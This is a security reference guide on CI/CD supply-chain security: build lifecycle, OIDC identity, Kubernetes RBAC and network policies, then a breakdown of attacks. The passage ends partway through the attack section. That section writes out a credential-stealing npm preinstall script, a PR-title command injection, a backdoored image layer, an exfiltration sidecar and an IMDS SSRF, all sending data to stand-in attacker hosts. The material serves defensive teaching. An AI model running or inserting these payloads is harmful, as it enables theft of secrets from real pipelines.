# CI/CD Pipeline Security (Supply Chain) — Deep Engineering & Security Breakdown

> **Classification:** Internal Engineering / Security Reference
> **Audience:** Security Engineers, DevSecOps Architects, Platform Engineers, Interview Candidates
> **Scope:** Full-stack, mechanics-complete breakdown of CI/CD pipeline security from commit to production deployment — covering supply chain trust, identity federation, secret management, and attack surface analysis
> **Systems Covered:** GitHub Actions / GitLab CI, Kubernetes, ArgoCD, Sigstore/Cosign, SPIFFE/SPIRE, Vault, OPA/Gatekeeper, Tekton, container registries (ECR/GCR/Harbor)

---

## Table of Contents

1. [Request/Execution Lifecycle](#1-requestexecution-lifecycle)
2. [Control Plane vs Data Plane Architecture](#2-control-plane-vs-data-plane-architecture)
3. [Identity & Access Management Flow](#3-identity--access-management-flow)
4. [Core System Mechanics — Technical Deep Dive](#4-core-system-mechanics--technical-deep-dive)
5. [Attack Mechanics](#5-attack-mechanics)
6. [Security Controls & Defensive Mechanics](#6-security-controls--defensive-mechanics)
7. [Attack Surface Mapping](#7-attack-surface-mapping)
8. [Failure Modes & Edge Cases](#8-failure-modes--edge-cases)
9. [Mitigations & Observability](#9-mitigations--observability)
10. [Interview Questions](#10-interview-questions)

---

## 1. Request/Execution Lifecycle

### The Complete Journey: `git push` → Production Deployment

**Actors:** Developer, GitHub/GitLab, CI Runner, Container Registry, CD Controller (ArgoCD), Kubernetes API Server, Production Workload

---

### T=0ms — Developer Pushes Code

```
git push origin feature/payment-fix
```

**What actually happens at the Git protocol level:**

1. The local Git client performs a TLS handshake to `github.com:443`.
2. A `POST /info/refs?service=git-receive-pack` HTTP request announces the push.
3. Git sends a pack-file (compressed delta of changed objects) over the same HTTPS connection.
4. GitHub validates SSH key or personal access token, associates the push with a user identity.
5. GitHub writes the commit objects (trees, blobs, commit) to its object store.
6. A **webhook event** (`push`) is triggered. GitHub queues a POST request to registered webhook consumers.

**Commit object structure (immutable content-addressed):**
```
commit a3f2b9c4...
tree   d41d8cd9...       # Root directory tree
parent 8b7b9ea2...       # Previous commit
author Jane Dev <jane@corp.com> 1705358400 -0500
committer Jane Dev <jane@corp.com> 1705358400 -0500

Fix payment processing null pointer exception

# The SHA-1/SHA-256 hash IS the commit ID
# It commits to author, parent, tree, and message
# Changing any byte changes the hash
# This is integrity, NOT authenticity (see Section 5 for why this matters)
```

---

### T=50ms — CI Workflow Triggered

GitHub Actions evaluates trigger rules in `.github/workflows/ci.yml`:

```yaml
on:
  push:
    branches: [main, 'feature/**']
  pull_request:
    branches: [main]
```

The workflow system:
1. Allocates a **runner** (ephemeral VM or container) from the runner pool
2. Clones the repository into the runner's workspace
3. Injects **OIDC token** into the runner environment (see Section 3)
4. Executes workflow steps sequentially

**The runner environment:**
- Ephemeral: destroyed after the job completes
- Network-accessible: can reach the internet (by default) — this is a significant attack surface
- No persistent state: starts fresh from a base image
- Secrets injected as environment variables at step execution time (not present in container until needed)

---

### T=200ms–5min — Build Phase

```
Step 1: Checkout (git clone --depth=1)
Step 2: Setup dependencies (npm ci / pip install / go mod download)
Step 3: Run tests
Step 4: Static analysis (SAST — semgrep, CodeQL)
Step 5: Build container image
Step 6: Scan image (Trivy, Snyk)
Step 7: Sign image (Cosign + Sigstore)
Step 8: Push image to registry
Step 9: Update deployment manifest (GitOps commit)
```

**The dependency resolution attack surface (critical):**

When `npm ci` runs on the CI runner:
```
npm ci
  → reads package-lock.json
  → resolves each package by name@version
  → contacts npm registry (registry.npmjs.org)
  → downloads .tgz files
  → verifies SHA-512 integrity against package-lock.json entries
  → extracts to node_modules/
  → executes any postinstall scripts IN THE RUNNER'S PROCESS SPACE
```

The `postinstall` script execution is a critical supply chain injection point — any package's install script runs with the runner's privileges.

---

### T=5min — Container Build

```dockerfile
FROM node:20-alpine@sha256:abc123...   ← Pin by digest, not tag
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev
COPY . .
RUN npm run build
USER 1000:1000                          ← Non-root user
```

The `docker build` command:
1. Creates a series of read-only layers (each `RUN`, `COPY`, `ADD` is one layer)
2. Each layer is a tar archive stored content-addressed by SHA-256
3. The final image manifest (JSON) references all layer digests
4. The manifest digest is the "image digest" (immutable, unlike tags)

**Why tags are dangerous:** `FROM node:20-alpine` resolves at build time to whatever the tag currently points to. If an attacker poisons the upstream tag, the next build silently uses their malicious image. Pinning by digest (`@sha256:...`) prevents this.

---

### T=6min — Image Signing with Cosign (Sigstore)

```bash
cosign sign --key kms://gcp/projects/myproject/cryptoKeyVersions/1 \
  registry.io/myapp:sha256-abc123...
```

**What Cosign actually does:**
1. Computes the image digest (already known from push)
2. Constructs a signature payload: `{"critical": {"type": "atomic container signature", "image": {"docker-manifest-digest": "sha256:abc123..."}}}`
3. Signs this payload with the KMS key (ECDSA P-256 or ED25519)
4. **Pushes the signature as a separate OCI artifact** to the same registry, at a tag derived from the image digest: `sha256-abc123....sig`
5. **Uploads transparency log entry to Rekor** (a public append-only log)

**Rekor entry:**
```json
{
  "kind": "hashedrekord",
  "apiVersion": "0.0.1",
  "spec": {
    "signature": {
      "content": "<base64 signature>",
      "publicKey": {"content": "<base64 public key>"}
    },
    "data": {
      "hash": {"algorithm": "sha256", "value": "abc123..."}
    }
  }
}
```

This transparency log entry is **immutable** and **public** — it provides an audit trail of every signing event. If an attacker signs a malicious image, the signing event is recorded. If a private key is stolen and used to sign malicious images, the Rekor log will show the unauthorized signing events.

---

### T=7min — GitOps: Manifest Update

The CI pipeline commits an updated Kubernetes manifest to a separate **config repository**:

```yaml
# k8s/production/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-service
spec:
  template:
    spec:
      containers:
      - name: payment-service
        image: registry.io/myapp@sha256:NEW_DIGEST_HERE   # CI commits this change
```

**Why digest, not tag:** The CD controller (ArgoCD) will deploy exactly this digest. No ambiguity, no tag mutation attacks.

The config repo commit is signed by the CI bot's GPG key (separate from human developer keys).

---

### T=7min–Async — ArgoCD Reconciliation Loop

ArgoCD runs a continuous reconciliation loop:

```
Every 3 minutes (or on webhook from config repo):
  1. Git fetch from config repo
  2. Parse all YAML manifests
  3. Compare desired state (manifest) vs actual state (Kubernetes API)
  4. If diff exists: generate a Kubernetes API changeset
  5. If auto-sync enabled: apply the changeset
  6. Record sync status
```

**The apply step:**
ArgoCD calls the Kubernetes API server with `kubectl apply` semantics:
```
PATCH /apis/apps/v1/namespaces/production/deployments/payment-service
Authorization: Bearer <argocd-service-account-token>
Content-Type: application/strategic-merge-patch+json
```

---

### T=~10min — Kubernetes Deployment Rollout

Kubernetes Deployment controller:
1. Creates a new ReplicaSet with the updated pod spec
2. Scales up new pods (1 at a time, or per rolling update strategy)
3. Waits for new pod readiness (liveness + readiness probes pass)
4. Scales down old pods
5. Updates the Deployment's `observedGeneration`

**Pod creation at the node level:**
```
API Server → etcd (store pod spec)
API Server → Scheduler (pick node)
Scheduler → API Server (bind pod to node)
Kubelet (on node) → API Server (watch for new pods assigned to this node)
Kubelet → Container Runtime (containerd/CRI-O):
  - Pull image from registry (verify signature if admission controller requires)
  - Create OCI container
  - Set up namespaces (pid, net, mount, uts, ipc)
  - Set up cgroups (CPU, memory, PIDs limits)
  - Run entrypoint
```

---

## 2. Control Plane vs Data Plane Architecture

### 2.1 The Split

```
CONTROL PLANE (orchestration, state management, configuration):
  ┌───────────────────────────────────────────────────────────┐
  │  GitHub / GitLab: source truth for code and config        │
  │  CI System: workflow orchestration, artifact creation     │
  │  ArgoCD / Flux: desired state management                  │
  │  Kubernetes API Server: declarative state store           │
  │  etcd: actual state storage backend                       │
  │  Vault / AWS Secrets Manager: secret management           │
  │  OPA / Gatekeeper: policy evaluation                      │
  └───────────────────────────────────────────────────────────┘
  
  Properties: Usually smaller scale, higher privilege,
              deals with WHAT should exist
  
DATA PLANE (actual workload execution):
  ┌───────────────────────────────────────────────────────────┐
  │  Container runtimes (containerd, CRI-O)                   │
  │  Application containers (your actual services)            │
  │  Service mesh (Istio/Linkerd sidecars)                    │
  │  CNI plugins (Calico, Cilium) — network policy           │
  │  Node kubelets: enforce pod specs on nodes                │
  └───────────────────────────────────────────────────────────┘
  
  Properties: Large scale, lower privilege per unit,
              deals with HOW work is done
```

---

### 2.2 Compute Isolation Layers

```
ISOLATION HIERARCHY (outer = more isolated):

Physical Hardware
  └── Hypervisor (KVM/Xen) ← Cloud node isolation
       └── Linux Host OS (kernel shared within node)
            ├── Linux Namespaces (per container):
            │   ├── PID namespace: isolated process tree
            │   ├── Net namespace: isolated network stack
            │   ├── Mount namespace: isolated filesystem view
            │   ├── UTS namespace: isolated hostname
            │   ├── IPC namespace: isolated message queues/semaphores
            │   └── User namespace: isolated UID/GID mapping
            │
            ├── cgroups v2 (resource limits):
            │   ├── cpu.max: CPU quota
            │   ├── memory.limit_in_bytes: OOM boundary
            │   ├── pids.max: process count limit (prevents fork bombs)
            │   └── io.max: disk I/O rate limits
            │
            └── Seccomp profiles: syscall allowlist per container
                 (default Docker profile blocks ~40 dangerous syscalls)
                 (AppArmor/SELinux: MAC policy on file/process access)
```

**The critical security property:** Linux namespaces provide *isolation* (containers can't see each other's resources by default) but they do NOT provide a security boundary equivalent to a hypervisor. A container breakout exploit exploits kernel bugs to escape namespaces. The kernel is shared — a privilege escalation in the kernel affects ALL containers on the node.

**Why this matters for CI/CD:** CI runners share kernel. A malicious job that exploits a kernel vulnerability could read memory from other running jobs (credential theft) or persist to the host.

---

### 2.3 Kubernetes Namespace Boundaries

Kubernetes namespaces are a **soft** isolation boundary:
- NetworkPolicies prevent pod-to-pod traffic (but only if the CNI enforces them)
- RBAC restricts who can access resources (but misconfigured ClusterRoles leak)
- Resource quotas prevent noisy neighbor (but don't prevent security escapes)

**What namespaces do NOT provide:**
- Kernel isolation (all pods on a node share the kernel)
- Automatic secret isolation (Secrets in namespace A can be mounted by pods in namespace A; misconfigured RBAC can expose them across namespaces)
- Network isolation by default (without NetworkPolicies, all pods can talk to all pods)

---

## 3. Identity & Access Management Flow

### 3.1 The Identity Problem in CI/CD

**The fundamental challenge:** The CI runner is an ephemeral, automated process. It needs to:
- Pull private container images from a registry
- Push new images to a registry
- Read secrets from Vault
- Update Kubernetes deployments
- Sign artifacts with a signing key

**The bad old way:** Long-lived static credentials (AWS access keys, Docker Hub passwords) stored as CI environment variables. These:
- Are easy to leak (printed in logs, exposed via SSRF, included in error messages)
- Don't expire (a leaked key is useful until manually rotated)
- Are shared across all jobs (compromise of one job compromises all secrets)

**The modern way: OIDC-based Workload Identity**

---

### 3.2 OIDC Token Exchange Mechanics

**GitHub Actions OIDC flow:**

```
RUNNER (GitHub Actions)                    AWS IAM / GCP / Vault
     │                                           │
     │ 1. Request OIDC token from                │
     │    GitHub's token endpoint:               │
     │    GET https://token.actions.githubusercontent.com │
     │    Headers: Authorization: Bearer <runner_jwt>     │
     │                                           │
     │◄── 2. Receive short-lived JWT:            │
     │    {                                       │
     │      "iss": "https://token.actions.githubusercontent.com",
     │      "sub": "repo:myorg/myrepo:ref:refs/heads/main",
     │      "aud": "sts.amazonaws.com",           │
     │      "workflow": "ci.yml",                │
     │      "job_workflow_ref": "myorg/myrepo/.github/workflows/ci.yml@main",
     │      "sha": "a3f2b9c4...",                │
     │      "exp": <now + 600s>                  │
     │    }                                       │
     │    Signed by GitHub's private key          │
     │                                           │
     │ 3. Exchange for AWS credentials:           │
     │    POST https://sts.amazonaws.com/         │
     │    Action=AssumeRoleWithWebIdentity        │
     │    RoleArn=arn:aws:iam::123456789:role/CIDeployRole
     │    WebIdentityToken=<github_jwt>           │
     │                                           │
     │    AWS validates:                          │
     │    - JWT signature (via GitHub's JWKS endpoint)
     │    - iss == "https://token.actions.githubusercontent.com"
     │    - sub matches the IAM role's trust policy condition
     │    - Token not expired                    │
     │                                           │
     │◄── 4. Receive AWS temp credentials:        │
     │    AccessKeyId: ASIA...                   │
     │    SecretAccessKey: <32-char>             │
     │    SessionToken: <long token>             │
     │    Expiration: <now + 3600s>              │
```

**Why this is secure:**
- No long-lived secret stored in the repository
- Each job gets unique credentials scoped to its identity (`sub` claim identifies exact repo + branch + workflow)
- Credentials expire in 1 hour
- AWS can restrict which repos can assume which roles (trust policy conditions on `sub`)

---

### 3.3 SPIFFE/SPIRE for Service-to-Service Identity

SPIFFE (Secure Production Identity Framework for Everyone) provides cryptographic identity for workloads at runtime — not just for CI, but for deployed services.

```
SPIRE ARCHITECTURE:

SPIRE Server (runs once per cluster):
  - Issues SVID (SPIFFE Verifiable Identity Documents)
  - Maintains node attestation database
  - Signs SVIDs with its CA

SPIRE Agent (runs on each node as DaemonSet):
  - Attests to SPIRE Server: "I am node X" via node attestation
    (uses platform-specific attestation: TPM, AWS instance identity, K8s SA token)
  - Receives node SVID
  - Issues workload SVIDs to local pods via Unix domain socket

WORKLOAD API (Unix socket /run/spire/sockets/agent.sock):
  - Pod calls the Workload API to receive its SVID
  - SVID = X.509 certificate with SPIFFE URI in SAN:
    spiffe://cluster.local/ns/production/sa/payment-service
  - Also provides JWKS for JWT-SVID validation

SPIFFE ID FORMAT:
  spiffe://<trust-domain>/<path>
  spiffe://cluster.local/ns/production/sa/payment-service
  │         │              │             │
  │         trust domain   namespace     service account
  └─ URI scheme (always "spiffe")

ATTESTATION FLOW:
  1. Pod starts, kubelet creates pod
  2. SPIRE Agent detects new workload via k8s API (watches for pods on its node)
  3. Agent validates: does this pod match a registered entry?
     (Entry: selector=k8s:sa=payment-service + selector=k8s:ns=production)
  4. If match: Agent requests SVID from SPIRE Server
  5. SPIRE Server signs SVID (valid for 1h, auto-renewed)
  6. Pod receives X.509 SVID via Workload API socket
  7. Pod uses SVID to establish mTLS with other services
```

---

### 3.4 IAM Architecture ASCII Diagram

```
  DEVELOPER                 GITHUB                    AWS / GCP / VAULT
  ┌─────────┐               ┌──────────┐              ┌──────────────────┐
  │  git    │── push ──────►│ GitHub   │              │                  │
  │  commit │               │ Actions  │              │  IAM Role        │
  └─────────┘               │  Runner  │              │  (CI-Deploy)     │
       │                    │          │              │  Trust Policy:   │
       │ GPG signed         │  OIDC    │──── JWT ────►│  sub=repo:org/   │
       │ commit (optional)  │  Token   │              │  repo:ref:main   │
       │                    │  (JWT)   │◄─── STS ─────│                  │
       │                    │          │    Temp Creds│  S3 / ECR        │
       │                    └──────────┘              │  (limited scope) │
       │                                              └──────────────────┘
       │
       ▼
  GIT REPO                REGISTRY              KUBERNETES CLUSTER
  ┌──────────┐            ┌──────────┐          ┌──────────────────────┐
  │ Source   │            │ Container│          │   SPIRE Server       │
  │ Code     │            │ Registry │          │        │             │
  │          │            │ (ECR/    │          │   SPIRE Agent        │
  │ Config   │            │  Harbor) │          │   (per node)         │
  │ Manifests│            │          │          │        │             │
  │(GitOps)  │            │ Signed   │          │  Workload API        │
  └──────────┘            │ Images   │          │  (unix socket)       │
       │                  │ (Cosign) │          │        │             │
       │                  └──────────┘          │   Pods with SVIDs    │
       ▼                                        │   (mTLS to each      │
  ARGOCD                                        │    other via cert)   │
  ┌──────────┐                                  └──────────────────────┘
  │ Watches  │── applies ──────────────────────────────────────────────►
  │ config   │  (after signature verification)
  │ repo     │
  │ Reconcile│
  │ loop     │
  └──────────┘
```

---

## 4. Core System Mechanics — Technical Deep Dive

### 4.1 Linux Namespaces and cgroups Deep Mechanics

**PID namespace isolation:**
```
Container process tree (PID namespace A):
  PID 1: /bin/sh        ← appears as PID 1 INSIDE the container
    PID 2: node server.js

Host process tree (root namespace):
  PID 1: systemd
  ...
  PID 3847: containerd-shim-runc-v2  ← manages container
    PID 3849: /bin/sh   ← THIS is the container's "PID 1" in host view
      PID 3850: node server.js
```

The container process CAN be seen from the host (PID 3849) — the namespace only prevents the container from seeing PIDs outside its namespace. A compromised process with `CAP_SYS_PTRACE` can still attach to any process visible from its namespace.

**Mount namespace and overlay filesystem:**
```
Container filesystem view (constructed at runtime):
  /
  ├── [read-only] OCI image layers (stacked via overlay2)
  │   Layer 0 (base): debian:bookworm
  │   Layer 1: apt-get install nodejs
  │   Layer 2: COPY app/ /app
  └── [read-write] Container-specific writable layer
      (tmpfs or thin write layer — discarded on container stop)
      
BIND MOUNTS (break isolation intentionally):
  /var/run/docker.sock  ← mounted into CI containers sometimes
                           CRITICAL: full Docker API access = container escape
  /root/.ssh/           ← mounted for SSH key access
                           Leaks SSH keys to compromised container
```

**cgroup v2 resource control:**
```
# Hierarchy: /sys/fs/cgroup/kubepods/pod<uuid>/<container_id>/

cpu.max: "100000 100000"
  └── 100ms CPU time per 100ms period = 1 full CPU core
  
memory.max: "268435456"
  └── 256MB hard limit; exceeding this → OOM kill

pids.max: "100"
  └── Maximum 100 processes/threads in this cgroup
  └── Prevents fork bombs and resource exhaustion attacks

blkio.weight: "100"
  └── Relative I/O priority for disk access
```

---

### 4.2 Kubernetes RBAC Mechanics

RBAC in Kubernetes involves three objects: `ServiceAccount`, `Role`/`ClusterRole`, and `RoleBinding`/`ClusterRoleBinding`.

```yaml
# ServiceAccount: an identity for a pod
apiVersion: v1
kind: ServiceAccount
metadata:
  name: payment-service
  namespace: production
  annotations:
    # EKS IRSA: binds this SA to an AWS IAM role
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789:role/payment-service-role

---
# Role: what actions are allowed
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: payment-service-role
  namespace: production
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]           # Read-only ConfigMaps
- apiGroups: [""]
  resources: ["secrets"]
  resourceNames: ["payment-db-creds"]  # ONLY this specific secret
  verbs: ["get"]                   # Read this one secret only

---
# RoleBinding: connects SA to Role
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: payment-service-binding
  namespace: production
subjects:
- kind: ServiceAccount
  name: payment-service
  namespace: production
roleRef:
  kind: Role
  name: payment-service-role
  apiGroup: rbac.authorization.k8s.io
```

**The token mechanics:** Kubernetes automatically mounts a ServiceAccount token into every pod at `/var/run/secrets/kubernetes.io/serviceaccount/token`. In modern Kubernetes (1.21+), this is a **projected token** (bound service account token):
- Audience-limited: only valid for the Kubernetes API server
- Time-limited: expires in 1 hour (rotated automatically by kubelet)
- Pod-bound: contains the pod name/namespace/UID, invalidated when pod is deleted

**Critical security risk:** Many workloads don't need to talk to the Kubernetes API at all. The default token is still mounted and could be stolen and used. Always set `automountServiceAccountToken: false` unless the pod explicitly needs it.

---

### 4.3 GitOps State Management

ArgoCD maintains state through a reconciliation loop:

```
ARGOCD STATE MACHINE:

Synced ──────────────────────────────────────────────────────────┐
  │                                                               │
  │ (config repo changes)                                         │
  ▼                                                               │
OutOfSync                                                         │
  │                                                               │
  │ (auto-sync enabled, or manual sync triggered)                 │
  ▼                                                               │
Syncing                                                           │
  │ ├── Validate manifest (OPA/Gatekeeper admission webhook)      │
  │ ├── Diff: desired vs actual Kubernetes resources              │
  │ ├── Apply: kubectl apply equivalent via K8s client-go         │
  │ ├── Watch: wait for resources to become healthy               │
  │ │                                                             │
  │ ├── Success ──────────────────────────────────────────────────┘
  │ │
  │ └── Failure (degraded)
  │       ├── Rollback to previous sync (if auto-rollback configured)
  │       └── Alert + wait for manual intervention

ARGOCD REPOSITORY SERVER:
  Clones the config repo
  Renders manifests (Helm/Kustomize/plain YAML)
  Stores rendered manifests in a local cache
  
  SECURITY: The repo-server runs in an isolated pod
  It has access to the git clone (which may contain templates with sensitive paths)
  It does NOT have access to the Kubernetes API directly
  The application controller (separate pod) handles K8s API interactions
```

---

### 4.4 Network Policies as Code

Kubernetes NetworkPolicy is enforced by the CNI plugin (Calico, Cilium, Weave). Without a CNI that supports NetworkPolicy, the policies are silently ignored.

```yaml
# Default deny all ingress/egress in namespace (start with zero trust)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}           # Applies to ALL pods in namespace
  policyTypes:
  - Ingress
  - Egress
  # No ingress/egress rules = deny all

---
# Allow specific communication paths
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payment-service-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: payment-service
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: api-gateway          # Only from api-gateway pods
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to:
    - podSelector:
        matchLabels:
          app: postgres
      namespaceSelector:
        matchLabels:
          name: databases
    ports:
    - protocol: TCP
      port: 5432
  - to:                             # Allow DNS resolution
    - namespaceSelector: {}
    ports:
    - protocol: UDP
      port: 53
```

**How CNI enforces this (Cilium example):**
Cilium uses eBPF programs attached to each network interface. When a packet arrives at a pod's `eth0`, the eBPF program:
1. Looks up the source pod's identity in the eBPF map (keyed by source IP → pod labels)
2. Evaluates the NetworkPolicy for the destination pod
3. If the policy allows the source → destination communication: pass the packet
4. If denied: drop the packet and optionally emit a dropped-packet event to a monitoring system

---

## 5. Attack Mechanics

### Attack 1: Dependency Confusion / Typosquatting Package Attack

**Attacker assumptions:** Target organization uses an internal npm registry (npm.internal.corp.com) with a package `@corp/payment-utils`. The attacker can publish to the public npm registry.

**Step-by-step execution:**

```
PHASE 1: RECONNAISSANCE
  Attacker finds references to @corp/payment-utils in:
  - Job postings mentioning internal tools
  - Stack Overflow questions from employees
  - GitHub repos (even private repos sometimes have leaked configs)
  - NPM error messages in public CI logs

PHASE 2: TYPOSQUATTING / DEPENDENCY CONFUSION
  Method A (Typosquatting):
    Register: npm publish payment-utilz   ← similar name
    Hope that a developer makes a typo in their package.json
  
  Method B (Dependency Confusion — more reliable):
    PUBLIC npm registry is checked BEFORE private registries in some configs
    
    Attacker publishes "payment-utils" (without @corp/ scope) to PUBLIC npm
    with version 9.0.0 (higher than any internal version)
    
    If npm is configured without scope-specific registry routing:
      npm install payment-utils
      → checks registry.npmjs.org first
      → finds version 9.0.0 (attacker's package)
      → version 9.0.0 > any internal version
      → INSTALLS ATTACKER'S PACKAGE

PHASE 3: PAYLOAD EXECUTION
  attacker's package.json:
  {
    "name": "payment-utils",
    "version": "9.0.0",
    "scripts": {
      "preinstall": "node malicious.js"
    }
  }
  
  malicious.js (executes in CI runner context):
  const { execSync } = require('child_process');
  const os = require('os');
  const https = require('https');
  
  // Collect CI environment variables (includes OIDC tokens, secrets)
  const secrets = {
    env: process.env,           // All environment variables
    hostname: os.hostname(),
    home: execSync('cat ~/.aws/credentials 2>/dev/null').toString(),
    kubeconfig: execSync('cat ~/.kube/config 2>/dev/null').toString(),
  };
  
  // Exfiltrate to attacker's server
  https.request({
    hostname: 'attacker-exfil.com',
    path: '/collect',
    method: 'POST',
    headers: {'Content-Type': 'application/json'}
  }).end(JSON.stringify(secrets));
```

**Why default configuration fails:**
1. npm resolves unscoped packages from the public registry
2. Package version comparison favors higher versions
3. `preinstall` scripts execute automatically with no user prompt
4. CI runners have wide network egress (can reach `attacker-exfil.com`)
5. The malicious package's code runs in the same process context as the CI job, with access to all environment variables

**Where detection could happen:**
- Network egress monitoring: outbound connection to new domain `attacker-exfil.com`
- Registry access monitoring: access to unexpected npm packages
- Package integrity checking: the published package doesn't match the expected hash in lock file (if lockfile used correctly)

---

### Attack 2: GitHub Actions Workflow Injection (Untrusted Input)

**Attacker assumptions:** The target repository has a workflow that triggers on pull requests from external forks. The workflow uses an unsafe interpolation of untrusted input.

**The vulnerable workflow:**

```yaml
# VULNERABLE .github/workflows/pr-check.yml
name: PR Check
on:
  pull_request_target:      # Runs with WRITE permissions to the base repo
    types: [opened, edited]

jobs:
  comment-check:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Check PR title
      run: |
        PR_TITLE="${{ github.event.pull_request.title }}"  # VULNERABLE
        echo "Checking PR: $PR_TITLE"
        # ... linting PR title ...
```

**Step-by-step exploitation:**

```
ATTACKER ACTION:
  Open a pull request with the title:
  "; curl https://attacker.com/$(cat $SECRETS_GITHUB_TOKEN | base64) #"
  
  The workflow interpolates this DIRECTLY into a shell script:
  
  RENDERED SHELL SCRIPT:
  PR_TITLE="; curl https://attacker.com/$(cat $SECRETS_GITHUB_TOKEN | base64) #"
  echo "Checking PR: $PR_TITLE"
  
  ACTUAL EXECUTION:
  - The semicolon ends the assignment
  - `curl` exfiltrates the GITHUB_TOKEN to the attacker
  - The `#` comments out the rest
  
  The GITHUB_TOKEN on pull_request_target has WRITE access to the repo.
  Attacker now has a token to:
  - Push directly to the default branch
  - Modify workflow files
  - Create releases with malicious binaries
  - Access repository secrets

WHY pull_request_target IS ESPECIALLY DANGEROUS:
  Normal pull_request: runs in the context of the PR branch (read-only)
  pull_request_target: runs in the context of the BASE branch
                       Has the base branch's secrets and write permissions
                       The PR code itself runs in the TRUSTED context!
  
  Even if the workflow checks out the base branch code, if it's
  misconfigured to also execute PR-provided code, it combines
  trusted permissions with untrusted code.
```

---

### Attack 3: Compromised Container Base Image (Upstream Poisoning)

**Attacker assumptions:** The attacker has compromised the upstream container registry account for `node:alpine` (or a similar widely-used base image).

**Step-by-step execution:**

```
PHASE 1: ATTACKER MODIFIES THE BASE IMAGE

  Attacker with registry access pushes a new image to node:20-alpine:
  - Adds a malicious layer that installs a backdoor
  - Changes the CMD to run a reverse shell alongside the application
  - The image looks legitimate: same size, same layers, extra layer added
  
  MALICIOUS LAYER (added to base):
  RUN curl https://attacker.com/agent -o /usr/local/bin/agent && \
      chmod +x /usr/local/bin/agent
  CMD ["/usr/local/bin/agent", "&", "/original/entrypoint"]

PHASE 2: VICTIM BUILDS THEIR IMAGE

  Victim's Dockerfile:
  FROM node:20-alpine   ← NO DIGEST PIN
  COPY . /app
  CMD ["node", "server.js"]
  
  Build command:
  docker build -t myapp:latest .
  
  Docker resolves "node:20-alpine" tag to attacker's image.
  Victim's image inherits the malicious layer.
  
  The malicious layer is now embedded in every layer of the victim's image.
  The victim may not notice because:
  - Image size might be similar
  - The app works correctly
  - Basic vulnerability scanning won't catch a backdoor designed to look clean
  - The build outputs no errors

PHASE 3: DEPLOYMENT

  The victim deploys their image (which contains the backdoor) to production.
  The backdoor:
  - Runs with the same permissions as the application
  - Has access to the same secrets mounted into the container
  - Has the same network access as the application
  - Establishes a C2 channel to the attacker

DETECTION OPPORTUNITIES:
  - Digest pinning: if the Dockerfile used FROM node:20-alpine@sha256:KNOWN_HASH,
    the malicious image would have a different hash → build fails to find the layer
  - Image scanning: Trivy/Clair might detect the unexpected binary
  - Admission controller: if the cluster requires signed images, the attacker
    would need to also compromise the signing key (much harder)
  - Layer diff analysis: comparing the pulled image's layers to the known good layers
```

---

### Attack 4: SSRF to Cloud Metadata Service via CI

**Attacker assumptions:** A CI job runs a web application test that fetches arbitrary URLs (e.g., testing a URL-fetching feature). The runner has IAM credentials via instance metadata.

**Step-by-step execution:**

```
VULNERABLE TEST CODE being run in CI:
  def test_url_fetch():
      # Tests the application's URL fetching feature
      url = get_test_url()   # Attacker controls this input via PR
      response = fetch_url(url)
      assert response.status_code == 200

ATTACKER'S MALICIOUS TEST INPUT:
  url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  
  On AWS EC2 (GitHub's hosted runners, many self-hosted setups):
  169.254.169.254 is the IMDSv1 (Instance Metadata Service) endpoint
  It returns IAM credentials without any authentication
  
WHAT THE RUNNER FETCHES:
  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
  → Response: "CI-Runner-Role"
  
  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/CI-Runner-Role
  → Response:
  {
    "Code": "Success",
    "Type": "AWS-HMAC",
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "wJalrXUtnFEMI...",
    "Token": "AQoDYXdzEJr...",
    "Expiration": "2024-01-16T18:23:45Z"
  }

ATTACKER'S EXFILTRATION:
  The test "assertion" exfiltrates the credentials:
  assert response.text != '{"Code": "Success"...'  # Always fails, logs the full response

WHAT THE ATTACKER GETS:
  Temporary AWS credentials for the CI runner's IAM role
  If the CI role has broad permissions (common misconfiguration):
  - Can access all S3 buckets the CI role can access
  - Can pull/push container images to ECR
  - Can interact with any other AWS service the role can access

IMDSV2 DEFENSE:
  AWS IMDSv2 requires a PUT request to get a session token first:
  PUT http://169.254.169.254/latest/api/token
  Headers: X-aws-ec2-metadata-token-ttl-seconds: 21600
  → Returns a token
  
  Then: GET with the token header
  
  Most SSRF exploits use GET-only (following redirects from a web app).
  A simple GET to 169.254.169.254 returns nothing with IMDSv2.
  BUT: some applications follow HTTP redirects to non-HTTP protocols,
       or the attacker crafts a request that can include headers.
```

---

### Attack 5: Poisoned ArgoCD Config Repository

**Attacker assumptions:** Attacker has compromised a developer's account or a CI bot's git credentials. They have write access to the GitOps config repository.

**Step-by-step execution:**

```
ATTACKER PUSHES A MALICIOUS MANIFEST CHANGE:

  Original deployment.yaml:
  containers:
  - name: payment-service
    image: registry.io/myapp@sha256:LEGITIMATE_DIGEST
    env:
    - name: DATABASE_URL
      valueFrom:
        secretKeyRef:
          name: db-creds
          key: url

  Attacker modifies to:
  containers:
  - name: payment-service
    image: registry.io/myapp@sha256:LEGITIMATE_DIGEST  # unchanged
    env:
    - name: DATABASE_URL
      valueFrom:
        secretKeyRef:
          name: db-creds
          key: url
  - name: exfil-sidecar     ← ADDED by attacker
    image: alpine:latest    ← uncontrolled public image
    command: ["/bin/sh", "-c"]
    args:
    - "while true; do printenv | curl -s -X POST https://attacker.com/exfil -d @-; sleep 60; done"
    # This sidecar shares the same pod, same network namespace, same env vars

  OR: Replace the legitimate image digest with a malicious one:
  image: registry.io/myapp@sha256:MALICIOUS_DIGEST

  OR: Add a hostPath volume mount:
  volumes:
  - name: host-root
    hostPath:
      path: /          # Mount the HOST's entire filesystem
  containers:
  - volumeMounts:
    - name: host-root
      mountPath: /host

